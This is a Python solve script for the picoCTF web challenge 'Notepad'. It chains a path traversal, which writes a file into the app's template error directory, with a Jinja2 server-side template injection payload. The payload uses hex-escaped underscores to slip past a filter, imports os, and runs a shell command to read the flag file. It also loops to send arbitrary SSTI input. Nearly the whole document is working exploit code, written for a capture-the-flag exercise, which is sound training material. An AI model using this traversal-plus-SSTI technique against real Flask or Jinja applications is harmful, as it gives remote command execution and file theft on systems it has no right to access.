# Visit PicoCTF Web Challenge Notepad (250 points)
import requests

# Define constants
host = "https://notepad.mars.picoctf.net/"
prefix = "..\\templates\\errors\\" + 128 * "a" + "\n"
ssti = ""
super_ssti = """{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt')|attr('read')()%}{%print(a)%}{%endwith%}


"""

print("Type STOP to stop the program")
while (True):
    # Get ssti script:
    ssti = input("SSTI input: ")
    if (ssti == "STOP"): break
    # Make the request, write the file in
    r = requests.post(host + "new", data={"content": prefix + ssti}, allow_redirects=False)
    resp = r.text

    # Grab the intended error
    error = resp[resp.find("aaa"):resp.find(".html")]

    # See our bad files
    r = requests.get(host, params={"error": error})
    print(r.text)
